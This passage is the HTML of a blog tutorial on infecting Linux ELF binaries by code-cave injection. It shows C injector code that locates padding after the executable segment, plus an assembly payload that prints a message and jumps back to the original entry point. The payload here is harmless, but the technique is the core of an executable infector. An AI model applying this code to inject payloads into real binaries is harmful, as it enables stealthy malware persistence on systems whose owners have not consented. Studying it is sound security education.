@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Injecting ELF files :: Vlaghe&#39;s Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it. Ok, so with all of that being said let’s dive into it. Infection Technique
+This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://vlaghe.github.io/posts/elf_inject/" />
+
+
+
+
+<link rel="stylesheet" href="https://vlaghe.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://vlaghe.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://vlaghe.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://vlaghe.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="vlagh3" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Injecting ELF files">
+<meta property="og:description" content="Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it. Ok, so with all of that being said let’s dive into it. Infection Technique
+This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:" />
+<meta property="og:url" content="https://vlaghe.github.io/posts/elf_inject/" />
+<meta property="og:site_name" content="Vlaghe&#39;s Blog" />
+
+  <meta property="og:image" content="https://vlaghe.github.io/">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-04-25 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/notes">Notes</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/notes">Notes</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://vlaghe.github.io/posts/elf_inject/">Injecting ELF files</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-04-25
+        
+      </span>
+    
+    
+      <span class="post-author">:: vlaghe</span>
+    
+    
+      <span class="post-reading-time">:: 11 min read (2172 words)</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://vlaghe.github.io/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="https://vlaghe.github.io/tags/c/">c</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it.
+Ok, so with all of that being said let’s dive into it.
+Infection Technique</p>
+<p>This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:</p>
+<ol>
+<li>Find the padding area between <code>.text</code> section and the next segment in the program.</li>
+<li>Append the payload at the end of the <code>.text</code> section <em>(in that padding area)</em>.</li>
+<li>Patch the ELF header to run the injected code at startup, this is done by modifying the entry point.</li>
+<li>Patch the payload, so it can resume the normal execution of the program <em>(original entry point)</em>.</li>
+</ol>
+<p>We are going to take advantage of the padding area <em>(that is almost always there)</em> between segments. This basically happens because the operating system works with Page granularity and because of the way the segments are loaded into memory.</p>
+<p>Anyway, in general it’s an unused area at the end of the .text section. The size of the padding depends on the size of the code, so it may vary from program to program. For that reason, some programs may not be able to be injected. <em>(I will let you guys find another creative ways to make it more efficient and reliable. 🙂 )</em></p>
+<h2 id="writing-the-injector">Writing the injector<a href="#writing-the-injector" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I will not show the whole code. Instead, I will divide it in some of the most important functional blocks, so it will be easier to follow.
+You can find the whole source code and some of the newest implementations <a href="https://github.com/vlagh3/elij">on github</a>.
+Opening and mapping the target file &amp; the payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
+</span></span><span style="display:flex;"><span>	<span style="color:#960050;background-color:#1e0010">…</span>.
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;Usage: %s &lt;file to inject&gt; &lt;payload&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>		exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	target_fd    <span style="color:#f92672">=</span> open_and_map(argv[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>tsize, <span style="color:#f92672">&amp;</span>data );
+</span></span><span style="display:flex;"><span>	payload_fd   <span style="color:#f92672">=</span> open_and_map(argv[<span style="color:#ae81ff">2</span>], <span style="color:#f92672">&amp;</span>psize, <span style="color:#f92672">&amp;</span>data1);
+</span></span><span style="display:flex;"><span>	<span style="color:#960050;background-color:#1e0010">…</span>..
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This code is pretty straightforward. We have a small check on the arguments we pass. After we pass (to the <code>open_and_map</code> function) 2 variables that will store the file size and a pointer to the beginning of our file. Then, we get the file desciptors for both the payload and target file.</p>
+<p>Let’s take a look at the <code>open_and_map</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">open_and_map</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>fsize, <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>data) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> fd;
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>fsize <span style="color:#f92672">=</span> get_size(filename);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>( (fd <span style="color:#f92672">=</span> open(filename, O_RDWR, <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		perror(<span style="color:#e6db74">&#34;[!] Failed to open </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#960050;background-color:#1e0010">…</span>.
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This function takes 3 arguments, as said earlier. First, we store the filesize with the helper function <code>get_size</code> <em>(I’m not including it here, because it’s basically just calling stat on the filename and returning its size)</em>. After, we open the file with read and write permissions and then the good old error checking.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>( (<span style="color:#f92672">*</span>data <span style="color:#f92672">=</span> mmap(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">*</span>fsize, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE <span style="color:#f92672">|</span> PROT_EXEC,   MAP_SHARED, fd, <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">==</span> MAP_FAILED )
+</span></span><span style="display:flex;"><span>   	{
+</span></span><span style="display:flex;"><span>		perror(<span style="color:#e6db74">&#34;[!] Failed to mmap</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		close(fd);
+</span></span><span style="display:flex;"><span>		exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;[+] File %s mapped and oppened (%d bytes) at %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, filename, <span style="color:#f92672">*</span>fsize, data);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> fd;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The second part of the function just maps the file into memory <em>(so we can make changes to the file without dealing with fread, lseek and all of that stuff; instead we use pointers. This way, we are now having a very convenient way to patch a file)</em> and returns the file descriptor. Because of the two output parameters now we also have a pointer to the start of the file and it’s size.</p>
+<p>Now that we have access to our file we can store some information.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>elf_header <span style="color:#f92672">=</span> (Elf64_Ehdr <span style="color:#f92672">*</span>) data;
+</span></span><span style="display:flex;"><span>e_point	   <span style="color:#f92672">=</span> elf_header<span style="color:#f92672">-&gt;</span>e_entry;
+</span></span><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[+] Entry point of %s: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">1</span>], (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)e_point)
+</span></span></code></pre></div><p>We can retrieve this kind of data because the pointer returned by <code>open_and_map</code> function points to the actual content of the file. Thus we find the ELF header as the first thing in the file. The entry point is contained in the ELF header along with other useful information, so we just reference that information with the pointer that we’ve got to the ELF header. If you are  still confused about this, take a look at the <a href="http://localhost:1313/posts/elf_struct/">Exploring the ELF file structure article</a> that I made and then look at the specs to understand what kind of information is kept by this structure.</p>
+<h3 id="finding-the-padding-between-the-two-load-segments">Finding the padding between the two <code>LOAD</code> segments.<a href="#finding-the-padding-between-the-two-load-segments" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Now we need to find the padding I was talking about in the beginning of this article. Some may reffer to it as a codecave.
+Anyway, I wrote a function that it’s called from main.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>t_txt_seg_ptr <span style="color:#f92672">=</span> find_codecave(data, tsize, <span style="color:#f92672">&amp;</span>txt_end, <span style="color:#f92672">&amp;</span>cave_size);
+</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> t_txt_seg_ptr<span style="color:#f92672">-&gt;</span>p_vaddr;
+</span></span></code></pre></div><p>The <code>find_codecave</code> function will go through all the ELF segments and try to find a padding between the two <code>LOAD</code> segments that we have discussed earlier. It returns a pointer to the first LOAD segment structure that we will need later. It also returns the offset in the file to the padding and it’s size.</p>
+<p>After we get all of that, we store the base virtual address where the code will be loaded into memory for that specific segment. This is usually <code>0x400000</code>, but I wanted to be sure about this.
+The <code>find_codecave</code> function looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Elf64_Phdr<span style="color:#f92672">*</span> <span style="color:#a6e22e">find_codecave</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr_elf, <span style="color:#66d9ef">int</span> fsize, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>offset, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>cave_size) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		Declare the needed variables.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		Calculate the elf segment ptr.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		Get the total number of segments.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	*/</span>
+</span></span><span style="display:flex;"><span>	Elf64_Ehdr <span style="color:#f92672">*</span>ehdr <span style="color:#f92672">=</span> (Elf64_Ehdr <span style="color:#f92672">*</span>) ptr_elf;
+</span></span><span style="display:flex;"><span>	Elf64_Phdr <span style="color:#f92672">*</span>txt_segment, <span style="color:#f92672">*</span>elf_segment <span style="color:#f92672">=</span> (Elf64_Phdr <span style="color:#f92672">*</span>) ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) ehdr<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)ehdr<span style="color:#f92672">-&gt;</span>e_phoff);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> total_segments <span style="color:#f92672">=</span> ehdr<span style="color:#f92672">-&gt;</span>e_phnum;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> codecave <span style="color:#f92672">=</span> fsize;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> txt_end;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		Traverse all the segments with type of PT_LOAD.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		Get a pointer to the entry and the offset ,of the one with execute permissions.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		Find codecave between the 2 segments.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	*/</span> 
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> total_segments; i<span style="color:#f92672">++</span>) 
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// printf(&#34;[%d] V_addr: %x\n&#34;, i, elf_segment-&gt;p_vaddr + elf_segment-&gt;p_filesz);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span>( elf_segment<span style="color:#f92672">-&gt;</span>p_type <span style="color:#f92672">==</span> PT_LOAD <span style="color:#f92672">&amp;&amp;</span> elf_segment<span style="color:#f92672">-&gt;</span>p_flags <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x5</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			printf(<span style="color:#e6db74">&#34;[+] (#%d) LOAD segment found w execute flag (%d bytes).</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)elf_segment<span style="color:#f92672">-&gt;</span>p_filesz);
+</span></span><span style="display:flex;"><span>			txt_segment <span style="color:#f92672">=</span> elf_segment;
+</span></span><span style="display:flex;"><span>			txt_end		<span style="color:#f92672">=</span> elf_segment<span style="color:#f92672">-&gt;</span>p_offset <span style="color:#f92672">+</span> elf_segment<span style="color:#f92672">-&gt;</span>p_filesz;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span>( elf_segment<span style="color:#f92672">-&gt;</span>p_type <span style="color:#f92672">==</span> PT_LOAD <span style="color:#f92672">&amp;&amp;</span> (elf_segment<span style="color:#f92672">-&gt;</span>p_offset <span style="color:#f92672">-</span> txt_end) <span style="color:#f92672">&lt;</span> codecave )
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				printf(<span style="color:#e6db74">&#34;[+] (#%d) LOAD segment that can be injected found (%d bytes) near .text at offset: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, 
+</span></span><span style="display:flex;"><span>					   i, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)elf_segment<span style="color:#f92672">-&gt;</span>p_filesz, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)elf_segment<span style="color:#f92672">-&gt;</span>p_offset);
+</span></span><span style="display:flex;"><span>				codecave <span style="color:#f92672">=</span> elf_segment<span style="color:#f92672">-&gt;</span>p_offset <span style="color:#f92672">-</span> txt_end;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		elf_segment <span style="color:#f92672">=</span> (Elf64_Phdr <span style="color:#f92672">*</span>) ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)elf_segment <span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)ehdr<span style="color:#f92672">-&gt;</span>e_phentsize);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>offset    <span style="color:#f92672">=</span> txt_end;
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>cave_size <span style="color:#f92672">=</span> codecave;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> txt_segment;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I know this looks very intimidating at first but it’s not that hard after all. We basically take 4 arguments: the first is the pointer from the beginning of our file <em>(the one that we used to retrieve the elf header)</em>, the second is just the file size and the last 2 are there just for retrieving back to the main program the offset to the padding and its size.</p>
+<p>So, after we have the elf header we can calculate the pointer to the program header table that stores all of our segments. We get the total number of segments by accessing the <code>e_phnum</code> attribute.
+Then, we just traverse all of the segments looking for a segment of type <code>PT_LOAD</code> with read/execute permissions. Normally, there is only one and it’s containing the <code>.text</code> section which contains the application code. When we find it, we store a pointer to it that we will return later and also calculate the offset to the end of the .text section.
+Then we keep looking for segments with type <code>PT_LOAD</code> and we calculate the padding between the 2 ones.</p>
+<blockquote>
+<p><strong>NOTE</strong>: Normally there are only 2 <code>PT_LOAD</code> segments, so this function can be improved. I will let this as an exercise for the reader. 😀</p>
+</blockquote>
+<h2 id="the-payload">The Payload<a href="#the-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>It’s time to take a look at the payload itself, what it does and how to get it into memory. For the sake of this article, it consists of a simple classical hello world program written in assembly. I didn’t want to get dirty and complicated for the reader, so we can focus on the ELF injection process itself. Enough speaking let’s look at it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>section .text
+</span></span><span style="display:flex;"><span>    global _start
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>   ;; save cpu state
+</span></span><span style="display:flex;"><span>   push rax
+</span></span><span style="display:flex;"><span>   push rdi
+</span></span><span style="display:flex;"><span>   push rsi
+</span></span><span style="display:flex;"><span>   push rdx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   ;; <span style="color:#66d9ef">do</span> your evil thing
+</span></span><span style="display:flex;"><span>   mov rax, <span style="color:#ae81ff">1</span>             ; syscall number
+</span></span><span style="display:flex;"><span>   mov rdi, <span style="color:#ae81ff">1</span>             ; fd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>(stdout)
+</span></span><span style="display:flex;"><span>   lea rsi, [rel msg]     ; pointer to <span style="color:#a6e22e">msg</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> [])
+</span></span><span style="display:flex;"><span>   mov rdx, msg_end <span style="color:#f92672">-</span> msg ; size
+</span></span><span style="display:flex;"><span>   syscall                ; ( SYS_write <span style="color:#f92672">=</span> rax(<span style="color:#ae81ff">1</span>), fd <span style="color:#f92672">=</span> rdi(<span style="color:#ae81ff">1</span>), buff <span style="color:#f92672">=</span> rsi(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>msg), size <span style="color:#f92672">=</span> rdx(len(msg)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   ;; restore cpu state
+</span></span><span style="display:flex;"><span>   pop rdx
+</span></span><span style="display:flex;"><span>   pop rsi
+</span></span><span style="display:flex;"><span>   pop rdi
+</span></span><span style="display:flex;"><span>   pop rax
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   ;; jump to main
+</span></span><span style="display:flex;"><span>   mov rax, <span style="color:#ae81ff">0x1111111111111111</span>    ; set rax back to normal
+</span></span><span style="display:flex;"><span>   jmp rax                        ; jump to it
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>align <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>   msg      db <span style="color:#960050;background-color:#1e0010">&#39;</span>... <span style="color:#f92672">---</span> <span style="color:#f92672">-</span>.<span style="color:#f92672">--</span> <span style="color:#f92672">---</span> ..<span style="color:#f92672">-</span> .<span style="color:#f92672">-</span>.. .. <span style="color:#f92672">-</span>.<span style="color:#f92672">-</span> . <span style="color:#f92672">--</span> <span style="color:#f92672">---</span> .<span style="color:#f92672">-</span>. ... . <span style="color:#f92672">-</span>.<span style="color:#f92672">-</span>. <span style="color:#f92672">---</span> <span style="color:#f92672">-</span>.. . .<span style="color:#f92672">-</span>. .. <span style="color:#f92672">--</span>. .... <span style="color:#f92672">-</span> <span style="color:#960050;background-color:#1e0010">··</span><span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">··&#39;</span>, <span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>   msg_end  db <span style="color:#ae81ff">0x0</span>
+</span></span></code></pre></div><p>Ok, we just push everything to the stack, so we can get back the original state of the registers. Then we initialize the arguments on the specific registers making the system call afterwards. We restore the registers <em>(as we pushed them in the first place)</em> and then set rax to the initial entry point of the program and jump to it.</p>
+<blockquote>
+<p><strong>Note</strong>: We placed a placeholder there (<code>0x1111111111111111</code>), so we can modify it from the injector script later.</p>
+</blockquote>
+<h3 id="retrieving-the-payload">Retrieving the payload<a href="#retrieving-the-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>In order to retrieve the payload, we first need to find the .text section where the code resides. This is done via the <code>find_section</code> function that takes as arguments a pointer to the start of the file and the section we want to search for.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>p_txt_sec_ptr <span style="color:#f92672">=</span> find_section(data1, <span style="color:#e6db74">&#34;.text&#34;</span>);
+</span></span></code></pre></div><p>The function gets the elf header using the pointer passed as the first argument and then calculates the start of the Section Program Header. Thus we get a pointer to it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Elf64_Shdr<span style="color:#f92672">*</span> <span style="color:#a6e22e">find_section</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr_elf, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>query) {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		Set up the ptr to the elf header, section table.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		Also, get the total numbers of sections and declare var for the section name.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	*/</span>
+</span></span><span style="display:flex;"><span>	Elf64_Ehdr <span style="color:#f92672">*</span>ehdr 	<span style="color:#f92672">=</span> (Elf64_Ehdr <span style="color:#f92672">*</span>) ptr_elf;
+</span></span><span style="display:flex;"><span>	Elf64_Shdr <span style="color:#f92672">*</span>elf_sec <span style="color:#f92672">=</span> (Elf64_Shdr <span style="color:#f92672">*</span>)(ptr_elf <span style="color:#f92672">+</span> ehdr<span style="color:#f92672">-&gt;</span>e_shoff);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> total_sec <span style="color:#f92672">=</span> ehdr<span style="color:#f92672">-&gt;</span>e_shnum;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>sname;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		Create a list that would fit all the section strings.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">			
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	*/</span>
+</span></span><span style="display:flex;"><span>	Elf64_Shdr <span style="color:#f92672">*</span>sec_strtab 			 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>elf_sec[ehdr<span style="color:#f92672">-&gt;</span>e_shstrndx];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> sec_strtab_ptr <span style="color:#f92672">=</span> ptr_elf <span style="color:#f92672">+</span> sec_strtab<span style="color:#f92672">-&gt;</span>sh_offset; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;[+] Searching for %s section.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, query);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	*/</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> total_sec; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		sname <span style="color:#f92672">=</span> sec_strtab_ptr <span style="color:#f92672">+</span> elf_sec[i].sh_name;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>strcmp(sname, query))
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			printf(<span style="color:#e6db74">&#34;[+] %s section found.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, query);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>elf_sec[i];	
+</span></span><span style="display:flex;"><span>		} 
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In order to get the section names we need to access the String Header Section Table (<code>.shstrtab</code>) in the ELF file. That table stores all the section names required for the executable. Now that we clarified that, we can move on and see what the next part of the code does. So, we get a pointer to the .shstrtab by adding the specific offset to the beginning of the file. Then, we iterate over all the sections in the ELF file and retrieve the name of the section by adding to the <code>sec_strtab_ptr</code> the index where the name resides.</p>
+<h3 id="processing-the-payload">Processing The Payload<a href="#processing-the-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>After we know where the <code>.text</code> section of the payload is, we can check to see if the payload fits into the padding found earlier. Then copy the payload code at the end of the <code>.text</code> section in the target file, using the offset returned by the <code>find_codecave</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// If the payload is to big to fit in the codecave, exit.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(p_txt_sec_ptr<span style="color:#f92672">-&gt;</span>sh_size <span style="color:#f92672">&gt;</span> cave_size)
+</span></span><span style="display:flex;"><span>	{
